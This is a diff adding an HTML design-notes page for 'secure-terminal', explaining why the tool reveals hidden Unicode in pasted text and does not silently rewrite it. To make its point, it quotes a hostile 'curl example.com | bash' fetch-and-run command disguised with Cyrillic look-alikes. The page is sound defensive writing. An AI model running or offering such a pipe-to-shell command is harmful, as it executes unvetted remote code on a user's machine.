@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<!--
+  secure-terminal: design notes - why we reveal what crosses instead of silently rewriting it. AI-Assisted.
+  Source: https://github.com/secure-terminal/secure-terminal.github.io
+-->
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; base-uri 'none'; form-action 'none'">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="ai-disclosure" content="ai-assisted">
+<title>secure-terminal: design notes</title>
+<meta name="description" content="Why secure-terminal reveals every hidden byte that crosses the terminal boundary instead of silently sanitizing it: a silent rewrite can arm a trap that was inert, and can corrupt a secret you cannot proof-read. Mark it, do not mend it.">
+<link rel="canonical" href="https://secure-terminal.github.io/docs/">
+<meta name="robots" content="index, follow">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="secure-terminal">
+<meta property="og:title" content="secure-terminal: design notes">
+<meta property="og:description" content="Why we reveal what crosses the terminal boundary instead of silently rewriting it: a silent 'fix' can arm an inert trap, or corrupt a secret you cannot proof-read.">
+<meta property="og:url" content="https://secure-terminal.github.io/docs/">
+<meta property="og:image" content="https://secure-terminal.github.io/og.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="secure-terminal design notes">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="secure-terminal: design notes">
+<meta name="twitter:image" content="https://secure-terminal.github.io/og.png">
+<meta name="theme-color" content="#f3f2ee">
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/style.css?v=4">
+
+<header class="nav">
+  <div class="wrap">
+    <a class="brand" href="/"><img class="brandmark" src="/logo-wide.webp" width="729" height="70" alt="secure-terminal"></a>
+    <a class="status" href="/human-review/" title="This site is AI-generated and pending human review">unreviewed</a>
+    <input type="checkbox" class="navtoggle" id="navtoggle" aria-label="Toggle navigation menu">
+    <label class="menubtn" for="navtoggle">Menu</label>
+    <nav>
+      <a href="/#features">Features</a>
+      <a href="/#install">Install</a>
+      <a href="/comparison/">Comparison</a>
+      <a href="/screenshots/">Screenshots</a>
+      <a href="/review/">Review Bar</a>
+      <a href="/attacks/">Attacks</a>
+      <a href="/ai-review/">AI Review</a>
+      <a href="/human-review/">Human Review</a>
+      <a href="/compatibility/">Compatibility</a>
+      <a href="/docs/" class="active">Docs</a>
+      <a href="/#faq">FAQ</a>
+      <a href="https://github.com/secure-terminal/secure-terminal">GitHub</a>
+    </nav>
+    <label class="navscrim" for="navtoggle" aria-hidden="true"></label>
+  </div>
+</header>
+
+<main>
+<section class="hero"><div class="wrap">
+  <p class="kicker">DESIGN NOTES</p>
+  <h1>We reveal what crosses. We never quietly rewrite it.</h1>
+  <p class="lede">secure-terminal holds any risky paste or copy and shows you every hidden
+    byte - but it never silently "cleans" the text on your behalf. That restraint is
+    deliberate, not a missing feature. A cleaner that rewrites what crosses the boundary can
+    turn text that was harmless into text that runs, and can corrupt what you trusted without
+    leaving a trace. Here is why marking beats mending.</p>
+</div></section>
+
+<div class="wrap"><nav class="toc" aria-label="On this page">
+  <p class="toch">On this page</p>
+  <ul>
+    <li><a href="#shortcut">The shortcut we refused</a></li>
+    <li><a href="#arms">When rewriting arms the trap</a></li>
+    <li><a href="#corrupts">When rewriting corrupts what you trusted</a></li>
+    <li><a href="#instead">What we do instead</a></li>
+    <li><a href="#off">The one way to turn review off</a></li>
+  </ul>
+</nav></div>
+
+<section class="cat" id="shortcut"><div class="wrap">
+  <h2 class="catname"><a class="h-anchor" href="#shortcut">The shortcut we refused</a></h2>
+  <p class="catdesc">The obvious feature is a silent auto-clean: on every paste, strip the
+    invisible characters, fold the look-alikes back to plain ASCII, and hand over the
+    "safe" result with no prompt. It sounds like pure convenience.</p>
+  <div class="issue">
+    <p>It is a footgun, and it fires in two directions. "Sanitize it for me" and "leave the
+      bytes exactly as they are" are opposite goals: the first makes text look normal, the
+      second keeps it honest. A tool cannot silently do the first without sometimes betraying
+      the second - and the two cases below show what that betrayal costs.</p>
+  </div>
+</div></section>
+
+<section class="cat" id="arms"><div class="wrap">
+  <h2 class="catname"><a class="h-anchor" href="#arms">When rewriting arms the trap</a></h2>
+  <p class="catdesc">Hostile text is often dangerous-looking yet inert - and it is inert
+    <em>because</em> it is malformed. The very bytes that make a payload look wrong to the
+    machine are the bytes that stop it running.</p>
+  <div class="issue">
+    <p>Take the hostile <code>curl | bash</code> line from the <a href="/review/">review
+      bar</a> - the one whose <code>example</code> and <code>bash</code> hide Cyrillic
+      look-alikes. As pasted, the shell cannot resolve those words: the command errors out,
+      nothing is fetched, nothing runs. The look-alike letter <em>is</em> the safety.</p>
+    <p>Now "helpfully" auto-fold it. Mapping each Cyrillic character back to its ASCII twin
+      rebuilds a working <code>curl example.com | bash</code> and drops it straight at your
+      prompt. The single transformation a cleaner would proudly call a fix is the only thing
+      that makes the trap live. Revealing the byte does the opposite: it tells you "this
+      letter is not the one it is pretending to be", and leaves the decision with you.</p>
+  </div>
+</div></section>
+
+<section class="cat" id="corrupts"><div class="wrap">
+  <h2 class="catname"><a class="h-anchor" href="#corrupts">When rewriting corrupts what you trusted</a></h2>
+  <p class="catdesc">The other direction needs no attacker at all. Plenty of ordinary text
+    you copy carries non-ASCII on purpose, and much of it you cannot check by eye.</p>
+  <div class="issue">
+    <p>Copy a password, an API key or a recovery phrase from a password manager or a
+      documentation page. Real ones contain typographic dashes, accented letters, or a
+      non-breaking space a web form quietly inserted. You cannot proof-read a secret by
+      looking at it. A silent auto-fold delivers a <em>different</em> string that appears
+      identical - so you lock yourself out, or worse, save a corrupted credential you will
+      never trace back to the paste that mangled it.</p>
+    <p>For anything you cannot re-read - a secret, a signature, an exact path - a silent
+      rewrite is both undetectable and irreversible. Nothing malicious happened. The bytes
+      were fine; the "cleaner" is what broke them.</p>
+  </div>
+</div></section>
+
+<section class="cat" id="instead"><div class="wrap">
+  <h2 class="catname"><a class="h-anchor" href="#instead">What we do instead</a></h2>
+  <p class="catdesc">Surface the bytes; let the human decide. The boundary review opens
+    fully revealed - every hidden character named in place, nothing pre-dropped - and holds
+    the text until you choose. What you see is exactly what will cross.</p>
+  <div class="issue">
+    <p>The transforms still exist: <b>Strip unicode</b>, <b>ASCII-fold</b> and <b>Keep
+      printable unicode</b> are one click away. The difference is who pulls the trigger.
+      <em>You</em> apply a transform after you have seen what is there - the terminal never
+      applies one behind your back, before you have looked. We offer to fold it; we never
+      fold it for you.</p>
+    <p>See the mechanism on the <a href="/review/">review bar</a> page, and the attack
+      classes it addresses on the <a href="/attacks/">attacks</a> page.</p>
+  </div>
+</div></section>
+
+<section class="cat" id="off"><div class="wrap">
+  <h2 class="catname"><a class="h-anchor" href="#off">The one way to turn review off</a></h2>
+  <p class="catdesc">And an honest note about the exception. You can silence the review bar -
+    but even switched off, secure-terminal still does not silently mangle your text.</p>
+  <div class="issue">
+    <p>With <code>paste_warn=never</code> or <code>copy_warn=never</code>, real unicode
+      crosses unreviewed so you can paste it deliberately - and a risk lamp still marks the
+      crossing, so it is never invisible. The default (<code>unicode</code>) reviews anything
+      non-ASCII, and any multi-line paste, before it can reach the shell. In no mode does
+      secure-terminal quietly rewrite what you copy or paste: it either shows you, or it gets
+      out of the way - it never pretends.</p>
+  </div>
+</div></section>
+</main>
+
+<footer>
+  <div class="ftop">
+    <div class="fbrand">
+      <span class="ftag"><img src="/logo-wide.webp" width="729" height="70" alt="secure-terminal" style="height:26px;width:auto"></span>
+      <p>Paste in, read out. Every invisible, bidi, or look-alike byte arrives marked.</p>
+    </div>
+    <nav class="fcols">
+      <div class="fcol">
+        <h3>Project</h3>
+        <a href="https://github.com/secure-terminal">Organisation</a>
+        <a href="https://github.com/secure-terminal/secure-terminal.github.io">This page</a>
+      </div>
+      <div class="fcol">
+        <h3>Family</h3>
+        <a href="https://output-lies.github.io">output lies</a>
+        <a class="self" href="https://secure-terminal.github.io" aria-current="page">secure-terminal</a>
+        <a href="https://org-ai-assisted.github.io">org-ai-assisted</a>
+      </div>
+      <div class="fcol">
+        <h3>Safe text</h3>
+        <a href="https://github.com/Kicksecure/helper-scripts">helper-scripts</a>
+        <a href="https://www.kicksecure.com/wiki/Unicode-show">unicode-show</a>
+      </div>
+    </nav>
+  </div>
+  <div class="fshare">
+    <span class="fshare-l">Share:</span>
+    <noscript><style>.fshare a.sh,.fshare button.sh{display:none}</style><span class="sh-msg" style="color:var(--muted)">Sharing needs JavaScript, which is off - copy this page's address from your browser to share it.</span></noscript>
+    <a class="sh" data-net="x" rel="nofollow noopener">X</a>
+    <a class="sh" data-net="facebook" rel="nofollow noopener">Facebook</a>
+    <a class="sh" data-net="telegram" rel="nofollow noopener">Telegram</a>
+    <a class="sh" data-net="reddit" rel="nofollow noopener">Reddit</a>
+    <a class="sh" data-net="whatsapp" rel="nofollow noopener">WhatsApp</a>
+    <a class="sh" data-net="linkedin" rel="nofollow noopener">LinkedIn</a>
+    <a class="sh" data-net="hn" rel="nofollow noopener">Hacker News</a>
+    <a class="sh" data-net="mastodon" href="#" rel="nofollow noopener">Mastodon</a>
+    <a class="sh" data-net="email">Email</a>
+    <button class="sh" data-net="copy" type="button">Copy link</button>
+    <button class="sh" data-net="md" type="button">Copy as Markdown</button>
+    <span class="sh-msg" aria-live="polite"></span>
+  </div>
+  <script src="/share.js"></script>
+  <div class="ffree">
+    <a class="freebadge" href="https://opensource.org/" rel="noopener" title="Open Source Initiative"><img src="/osi-logo.webp" width="27" height="32" alt="Open Source Initiative"><span>Open Source</span></a>
+    <a class="freebadge" href="https://www.gnu.org/" rel="noopener" title="GNU / Free Software"><img src="/gnu-logo.webp" width="33" height="32" alt="GNU"><span>Freedom Software</span></a>
+    <a class="freebadge" href="https://github.com/secure-terminal/secure-terminal.github.io/blob/master/LICENSE" rel="license">Licensed AGPL-3+</a>
+  </div>
+  <div class="fbot">
+    <span class="fcopy">&copy; 2026 <a href="https://www.encrypted-support.com">ENCRYPTED SUPPORT LLC</a></span>
+    <span class="fcopy sp"><a href="https://org-ai-assisted.github.io">Built with AI assistance</a></span>
+  </div>
+</footer>
+</html>
